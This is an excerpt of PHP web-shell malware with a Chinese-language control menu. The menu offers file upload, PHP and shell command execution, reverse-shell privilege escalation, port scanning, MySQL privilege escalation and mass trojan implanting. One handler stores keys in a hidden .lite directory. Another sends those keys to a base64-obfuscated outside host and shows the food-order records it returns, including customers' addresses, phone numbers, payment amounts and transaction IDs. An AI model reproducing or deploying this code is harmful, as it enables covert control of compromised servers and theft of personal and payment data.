...
switch ($eanver){
    ...
    case "plsk":
       if(isset($_GET['key'])){
        // todo 写数据 echo "写入数据成功";
        $name = $_GET['key'];
        $newdir = str_path(root_dir . '/.lite' );
        $newFile = str_path(root_dir . '/.lite'.'/'.$name );
        @mkdir($newdir, 0777);
        if(@file_exists($newFile)) {
            echo "repost";exit;//重复提交
        }else{
            if(touch($newFile)){
                echo "ok";
            }else{
...
//目录
$class = array("信息操作" => array("upfiles" => "上传文件", "phpinfo" => "基本信息", "info_f" => "系统信息", "phpcode" => "执行PHP脚本"), "提权工具" => array("sqlshell" => "执行SQL执行", "mysql_exec" => "MYSQL操作", "myexp" => "MYSQL提权", "cmd" => "执行命令", "linux" => "反弹提权", "downloader" => "文件下载", "port" => "端口扫描"), "批量操作" => array("guama" => "批量挂马清马", "tihuan" => "批量替换内容", "scanfile" => "批量搜索文件", "scanphp" => "批量查找木马"), "脚本插件" => array("getcode" => "获取网页源码","getJsonData"=>"获取数据列表"));
...
<div class=\"actall\"><input type=\"submit\" value=\"扫描\" style=\"width:80px;\"></div>
    ...
    case "getJsonData":
         ...
         $json_key_arr = array("goods_preview"=>"商品单","goods_total_num"=>"商品总数","take_type"=>"取餐方式","address_detail"=>"收货地址","receiver"=>"取餐人","user_phone"=>"联系电话","pay_price"=>"支付金额","extra_info"=>"用户备注","create_time"=>"付款时间","pay_way"=>"付款方式","pay_sys_id"=>"交易ID");
         $dirArrays = [];   
         $dirNames= do_show(str_path(root_dir."/.lite"));
         foreach($dirNames as &$v){
                $v = @pathinfo($v)['filename'];
         }
        //  var_dump($dirNames);exit;
        //  $dirNames = ["AAC-kJB6-WNxFCdlNLJJl4KVGfRACuOHMqp1hNwxW6Zl3w","AAC-kJB6-WNxFCdlNLJJl4KVGfRACuOHMqp1hNwxW6Zl3w"]; 
          //获取数据
         foreach($dirNames as $v){ 
            $va=GetHtml(base64_decode("aHR0cHM6Ly9zaWFza3kubmV0Lw==").$v);//base64_decode("aHR0cHM6Ly9zaWFza3kubmV0Lw==").$v aHR0cDovL2xvY2FsaG9zdC8=
            if($va!=null){
                $dirArrays[]=@json_decode($va, true);//json_decode($va);
            }
         } 
       //var_dump($dirArrays);exit;
         html_n("<script language=\"javascript\">
        function Delok(msg,gourl)
        {
            smsg = \"Do you sure delete [\" + unescape(msg) + \"]?\";
            if(confirm(smsg)){window.location = gourl;}
        }");
        html_base();
        html_n("</script>");
        html_n("请及时处理数据 或者下载数据");
        // if ((!empty($_POST['getJsonDataKey'])) && (!empty($_POST['getJsonDataKey']))) {
        //     //下载数据
        // }
        if ((!empty($_POST['getJsonDataKey'])) && (!empty($_POST['getJsonDataKey']))) {
            //删除数据
        ...
        $url="?eanver=getJsonData&getJsonDataKey=";

        
        html_n('<table width="100%" border=0 bgcolor="#555555">');
        
        html_n('<tr height="25">');   
        foreach($json_key_arr as $v){
           html_n('<td align="center" ><b>'.$v.'</b></td>');
        }
        html_n('<td align="center" ><b>操作</b></td>');
        html_n('</tr>');

        foreach($dirArrays as $keyIndex=>$item){
            
            html_n('<tr height="25">');   
            foreach($json_key_arr as $k=>$v){
                html_n('<td align="center">'.$item[$k].'</td>');
            }
            $_del_url = $url.$dirNames[$keyIndex];
            html_n('<td align="center" ><a href=\"#\" onClick="Delok(\''.$dirNames[$keyIndex].'\',\''.$_del_url.'\');return false;">删除</a> ');
            html_a("?down=" . $dirNames[$keyIndex], "下载", "title=\"下载" .  $dirNames[$keyIndex] . '"');
            html_n('</td></tr>');
         }
